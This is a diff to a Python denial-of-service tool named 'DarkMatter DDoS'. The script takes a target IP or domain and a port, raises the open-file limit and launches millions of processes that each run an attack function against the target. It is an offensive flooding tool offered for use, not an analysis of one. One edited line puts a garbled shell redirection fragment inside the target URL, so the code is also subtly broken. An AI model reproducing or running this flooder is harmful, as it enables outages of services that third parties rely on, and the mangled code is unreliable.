@@ -11,7 +11,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 10000000")
+    os.system("ulimit -n 200000000")
   except Exception as e:
     print(e)
     print("Could not start the script")
@@ -45,12 +45,12 @@ def attack():
 print("Welcome To DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}"
+url = f"http://+2>/dev/null{str(ip)}" 
 print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(5000000000000): #Magic Power
+  for i in range(9000000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
